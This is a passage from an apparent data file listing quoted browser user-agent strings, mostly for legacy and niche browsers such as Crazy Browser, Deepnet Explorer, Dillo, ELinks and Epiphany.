"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.336.0 Safari/533.1 ChromePlus/1.3.8.1",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; mimic; rv:9.3.0) Gecko/20120117 Firefox/3.6.25 Classilla/CFM",
"Mozilla/5.0 (Macintosh; U; PPC; en-US; mimic; rv:9.3.0) Clecko/20120101 Classilla/CFM",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100409 Firefox/3.6.3 CometBird/3.6.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.2.16) Gecko/20110325 Firefox/3.6.16 CometBird/3.6.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2009011615 Firefox/3.0.5 CometBird/3.0.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.5) Gecko/2009011615 Firefox/3.0.5 CometBird/3.0.5",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Comodo_Dragon/12.1.0.0 Chrome/12.0.742.91 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Comodo_Dragon/12.1.0.0 Chrome/12.0.742.91 Safari/534.30",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Comodo_Dragon/12.1.0.0 Chrome/12.0.742.91 Safari/534.30",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.11) Gecko/20100101 conkeror/1.0pre (Debian-1.0~~pre+git120527-1)",
"Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20121010 conkeror/1.0pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:6.0.1) Gecko/20110831 conkeror/0.9.3",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20101209 Conkeror/0.9.2 (Debian-0.9.2+git100804-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.15) Gecko/20101028 Conkeror/0.9.2 (Debian-0.9.2+git100804-1)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.14) Gecko/20101020 Conkeror/0.9.2 (Debian-0.9.2+git100804-1)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1; Crazy Browser 9.0.04)",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Crazy Browser 3.1.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 3.0.5) ; .NET CLR 3.0.04506.30; InfoPath.2; InfoPath.3; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; Crazy Browser 3.0.5)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 1.1.4322; Crazy Browser 3.0.0 Beta2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Crazy Browser 3.0.0 Beta2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0; Crazy Browser 3.0.0 Beta2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Crazy Browser 3.0.0 Beta2)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Crazy Browser 3.0.0 Beta2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; .NET CLR 2.0.50727; .NET CLR 3.0.04506.590; .NET CLR 3.5.20706; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; HbTools 4.7.0; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3; Crazy Browser 2.0.1); .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322; Crazy Browser 2.0.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 2.0.0 Beta 1; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; Crazy Browser 2.0.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Crazy Browser 2.0.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Crazy Browser 2.0.0)",
"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Crazy Browser 1.x.x)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; YComp 5.0.0.0; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MyIE2; Crazy Browser 1.0.5; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Hotbar 4.3.1.0; Crazy Browser 1.0.5; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts-MyWay; SV1; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DigExt; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5; .NET CLR 2.0.40607; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5; .NET CLR 1.0.3705)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5; (R1 1.3))",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; Crazy Browser 1.0.5)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461; Crazy Browser 1.0.5; .NET CLR 1.0.3705)",
"Cyberdog/2.0 (Macintosh; PPC)",
"Cyberdog/2.0 (Macintosh; 68k)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; Deepnet Explorer 1.5.3; Smart 2x2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 2.0.50727; .NET CLR 1.1.4322; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Deepnet Explorer 1.5.3; Smart 2x2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Deepnet Explorer 1.5.2; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; FunWebProducts; Deepnet Explorer 1.5.2; SpamBlockerUtility 4.7.1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.2; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.0; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.0; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-pl) AppleWebKit/312.8 (KHTML, like Gecko, Safari) DeskBrowse/1.0",
"Dillo/2.0",
"Dillo/0.8.6-i18n-misc",
"Dillo/0.8.6",
"Dillo/0.8.5-i18n-misc",
"Dillo/0.8.5",
"Dillo/0.8.3",
"Dillo/0.7.3",
"Dillo/0.6.4",
"Dooble/0.07 (de_CH) WebKit",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0",
"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
"ELinks/0.9.3 (textmode; Linux 2.6.11-auditor-10 i686; 80x24)",
"ELinks/0.9.3 (textmode; Linux 2.6.11 i686; 79x24)",
"ELinks/0.13.GIT (textmode; Linux 2.6.29 i686; 119x51-2)",
"ELinks/0.13.GIT (textmode; Linux 2.6.27-rc6.git i686; 175x65-3)",
"ELinks/0.13.GIT (textmode; Linux 2.6.26-rc7.1 i686; 119x68-3)",
"ELinks/0.13.GIT (textmode; Linux 2.6.24-1-686 i686; 175x65-2)",
"ELinks/0.13.GIT (textmode; Linux 2.6.24-1-686 i686; 138x60-2)",
"ELinks/0.13.GIT (textmode; Linux 2.6.22-3-686 i686; 84x37-2)",
"ELinks/0.13.GIT (textmode; Linux 2.6.22-3-686 i686; 104x48-2)",
"ELinks/0.13.GIT (textmode; Linux 2.6.22-2-686 i686; 148x68-3)",
"ELinks/0.12~pre5-8 (textmode; Debian; Linux 3.4.0-8.dmz.1-liquorix-amd64 x86_64; 67x35-3)",
"ELinks/0.12~pre5-1-lite (textmode; Debian; Linux 2.6.31-1+e517a5e9 x86_64; 100x45-2)",
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-15-generic x86_64; 207x60-2)",
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-15-generic i686; 80x24-3)",
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-14-generic i686; 180x56-2)",
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-14-generic i686; 120x36-2)",
"ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-13-generic i686; 114x36-2)",
"ELinks/0.12pre5 (textmode; Linux; 157x60-2)",
"ELinks/0.12pre2 (textmode; Linux; 168x43-2)",
"ELinks/0.12pre1.GIT",
"ELinks/0.12.GIT (textmode; Linux 2.6.21-1-686 i686; 198x78-3)",
"ELinks/0.11.7 (textmode; Linux 2.6.32-fw3 i686; 143x53-2)",
"ELinks/0.11.7 (textmode; FreeBSD 8.0-RC1 i386; 80x49-2)",
"ELinks/0.11.6 (textmode; Linux 2.6.30-ARCH i686; 128x48-2)",
"ELinks/0.11.6 (textmode; Linux 2.2.26 i686; 119x51-2)",
"ELinks/0.11.4rc1 (textmode; FreeBSD 7.1-RELEASE i386; 80x25-2)",
"ELinks/0.11.4rc1 (textmode; FreeBSD 7.0-RELEASE i386; 80x25-2)",
"ELinks/0.11.4rc1 (textmode; Darwin 8.11.0 Power Macintosh; 169x55-3)",
"ELinks/0.11.4rc0 (textmode; Linux 2.6.20-16-server i686; 102x34-2)",
"ELinks/0.11.4-3-lite (textmode; Debian; Linux 2.6.26-1-686 i686; 80x24-2)",
"ELinks/0.11.4-3 (textmode; Debian; Linux 2.6.26-1-sparc64 sparc64; 160x64-2)",
"ELinks/0.11.4 (textmode;Linux;80x24-2)",
"ELinks/0.11.4 (textmode; Linux; 80x24-2)",
"ELinks/0.11.4 (textmode; Linux 2.6.26-2-amd64 x86_64; 158x62-2)",
"ELinks/0.11.3-8ubuntu3 (textmode; Debian; Linux 2.6.27-9-generic i686; 205x56-2)",
"ELinks/0.11.3-8ubuntu3 (textmode; Debian; Linux 2.6.27-11-generic i686; 80x25-2)",
"ELinks/0.11.3-5ubuntu2 (textmode; Debian; Linux 2.6.24-19-generic i686; 80x24-2)",
"ELinks/0.11.3-5ubuntu2 (textmode; Debian; Linux 2.6.24-19-generic i686; 181x51-2)",
"ELinks/0.11.3-5ubuntu2 (textmode; Debian; Linux 2.6.24-16-generic i686; 80x24-2)",
"ELinks/0.11.3 (textmode; Linux; 80x24-2)",
"ELinks/0.11.3 (textmode; Linux 2.6.23-ARCH x86_64; 141x29-2)",
"ELinks/0.11.3 (textmode; Darwin 10.7.0 i386; 236x64-2)",
"ELinks/0.11.3 (textmode; Darwin 10.2.0 i386; 80x24-2)",
"ELinks/0.11.2 (textmode; Linux 2.6.17.13 i686; 80x25-2)",
"ELinks/0.11.2 (textmode; FreeBSD 6.3-RELEASE-p2 i386; 126x44-2)",
"ELinks/0.11.2 (textmode; FreeBSD 6.2-RELEASE i386; 100x35-2)",
"ELinks/0.11.1-1.5ubuntu1-debian (textmode; Linux 2.6.22-14-server i686; 157x41-2)",
"ELinks/0.11.1-1.5ubuntu1-debian (textmode; Linux 2.6.22-14-generic i686; 80x24-3)",
"ELinks/0.11.1-1.5ubuntu1-debian (textmode; Linux 2.6.22-14-generic i686; 80x24-2)",
"ELinks/0.11.1-1.4-debian (textmode; Linux 2.6.22-2-686 i686; 64x24-2)",
"ELinks/0.11.1-1.4-debian (textmode; Linux 2.6.22-1-amd64 x86_64; 160x64-2)",
"ELinks/0.11.1-1.4-debian (textmode; Linux 2.6.21-1-686 i686; 198x78-3)",
"ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)",
"ELinks/0.11.1-1.2ubuntu2.1-debian (textmode; Linux 2.6.20-15-generic i686; 80x24-2)",
"ELinks/0.11.1-1.2etch1-debian (textmode; Linux 2.6.24.2-grsec i686; 80x24-2)",
"ELinks/0.11.1-1.2-debian (textmode; Linux 2.6.8-3-386 i686; 80x24-2)",
"ELinks/0.11.1-1.2-debian (textmode; Linux 2.6.15-1-k7 i686; 80x38-2)",
"ELinks/0.11.1-1-debian (textmode; Linux 2.6.18-2-k7 i686; 142x42-2)",
"ELinks/0.11.1 (textmode; Linux; 122x44-2)",
"ELinks/0.11.1 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 98x33-2)",
"ELinks/0.11.1 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 97x33-2)",
"ELinks/0.11.1 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 80x24-2)",
"ELinks/0.11.1 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 127x43-2)",
"ELinks/0.11.1 (textmode; Linux 2.4.31 i686; 128x48-3)",
"ELinks/0.11.1 (textmode; FreeBSD 6.1-RELEASE i386; 212x61-2)",
"ELinks/0.11.0 (textmode; Linux; 100x24-2)",
"ELinks/0.10.6-1ubuntu3-debian (textmode; Linux 2.6.15-27-686 i686; 96x28-2)",
"ELinks/0.10.6-1ubuntu3-debian (textmode; Linux 2.6.15-27-686 i686; 197x64-2)",
"ELinks/0.10.6 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 104x37-2)",
"ELinks/0.10.4-7-debian (textmode; Linux 2.6.16-hardened-r10-pandora i686; 80x24-2)",
"ELinks/0.10.4-7-debian (textmode; Linux 2.6.11 i686; 89x23-2)",
"ELinks/0.10.3 (textmode; Linux; 80x24-2)",
"ELinks/0.10.3 (textmode; Linux; 123x38-2)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.13) Gecko/2009073022 EnigmaFox/3.0.13",
"Mozilla/5.0 (X11; U; Linux x86_64; it-it) AppleWebKit/534.26+ (KHTML, like Gecko) Ubuntu/11.04 Epiphany/2.30.6",
"Mozilla/5.0 (X11; U; Linux x86_64; fr-FR) AppleWebKit/534.7 (KHTML, like Gecko) Epiphany/2.30.6 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Epiphany/2.30.6 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux x86_64; ca-ad) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.6",
"Mozilla/5.0 (X11; U; Linux x86; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Epiphany/2.30.6 Safari/534.7",
"Mozilla/5.0 (X11; U; Linux i686; sv-se) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.6",
"Mozilla/5.0 (X11; U; Linux i686; it-it) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.2",
"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.30.0",
"Mozilla/5.0 (X11; U; Linux x86_64; nl-nl) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.29.91",
"Mozilla/5.0 (X11; U; Linux x86_64; fr-fr) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.29.91",
"Mozilla/5.0 (X11; U; Linux x86_64; zh-cn) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.28.2 SUSE/2.28.0-2.4",
"Mozilla/5.0 (X11; U; Linux x86_64; zh-cn) AppleWebKit/531.2+ (KHTML, like Gecko) Safari/531.2+ Epiphany/2.28.0 SUSE/2.28.0-2.4",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Fedora/2.24.3-4.fc10 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.7) Gecko/20080528 Epiphany/2.22",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.14) Gecko/20080528 Ubuntu/9.10 (karmic) Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.14) Gecko/20080528 Epiphany/2.22 (Debian/2.26.3-2)",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.1) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.13) Gecko/20080322 Epiphany/2.22 Firefox/2.0.0.4",
"Mozilla/5.0 (X11; U; Linux i686; en_GB; rv:1.9.0.1) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.9) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.7) Gecko/20080528 Epiphany/2.22",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.5) Gecko/20080528 Fedora/2.24.1-3.fc10 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.4) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.15) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.14) Gecko/20080528 Epiphany/2.22 (Debian/2.26.3-2)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9.0.12) Gecko/20080528 Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/20080528 (Gentoo) Epiphany/2.22 Firefox/3.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.14) Gecko/20080616 Fedora/2.20.3-4.fc8 Epiphany/2.20 Firefox/2.0.0.14",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.13) Gecko/20080326 (Debian-1.8.1.13-1) Epiphany/2.20",
"Mozilla/5.0 (X11; U; Linux ppc; en; rv:1.8.1.13) Gecko/20080325 Epiphany/2.20 Firefox/2.0.0.13",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9b3) Gecko Epiphany/2.20",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.19) Gecko/20081216 Epiphany/2.20 Firefox/2.0.0.19",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.17) Gecko/20080927 Epiphany/2.20 Firefox/2.0.0.17 (Dropline GNOME)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080418 Epiphany/2.20 Firefox/2.0.0.14",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-5) Epiphany/2.20",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-2) Epiphany/2.20",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.10) Gecko/20071213 Epiphany/2.20 Firefox/2.0.0.10",
"Mozilla/5.0 (X11; U; FreeBSD i386; pl; rv:1.8.1.12) Gecko/20080213 Epiphany/2.20 Firefox/2.0.0.12",
"Mozilla/5.0 (X11; U; FreeBSD i386; en; rv:1.8.1.12) Gecko/20080213 Epiphany/2.20 Firefox/2.0.0.12",
"Mozilla/5.0 (X11; U; OpenBSD amd64; en; rv:1.8.1.6) Gecko/20070817 Epiphany/2.18 Firefox/2.0.0.6",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.4) Gecko/20061201 Epiphany/2.18 Firefox/2.0.0.4 (Ubuntu-feisty)",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.3) Gecko/20061201 Epiphany/2.18 Firefox/2.0.0.3 (Ubuntu-feisty)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.5) Gecko/20070712 (Debian-1.8.1.5-1) Epiphany/2.18",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.4) Gecko/20070508 (Debian-1.8.1.4-1) Epiphany/2.18",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070322 Epiphany/2.18",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20061201 Epiphany/2.18 Firefox/2.0.0.3 (Ubuntu-feisty)",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.14) Gecko/20080416 Fedora/2.18.3-9.fc7 Epiphany/2.18 Firefox/2.0.0.14",
"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8.1) Gecko/20070322 Epiphany/2.18",
"Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.8.1.4) Gecko/20070628 Epiphany/2.16 Firefox/2.0.0.4",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.3) Gecko/20070403 Epiphany/2.16 Firefox/2.0.0.3",
"Mozilla/5.0 (X11; U; Linux sparc64; en-US; rv:1.8.0.14eol) Gecko/20070505 (Debian-1.8.0.15~pre080323b-0etch2) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.0.7) Gecko/20060928 Epiphany/2.14 (Ubuntu)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071201 (Debian-1.8.1.11-1) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061205 (Debian-1.8.0.9-1) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060928 (Debian-1.8.0.7-1) Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060924 Epiphany/2.14",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.5) Gecko/20060731 Ubuntu/dapper-security Epiphany/2.14 Firefox/1.5.0.5",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Epiphany/2.14 Firefox/1.5.0.4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.3) Gecko/20060523 Ubuntu/dapper Epiphany/2.14 Firefox/1.5.0.3",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.13pre) Gecko/20070505 (Debian-1.8.0.15~pre080131b-0etch1) Epiphany/2.14",
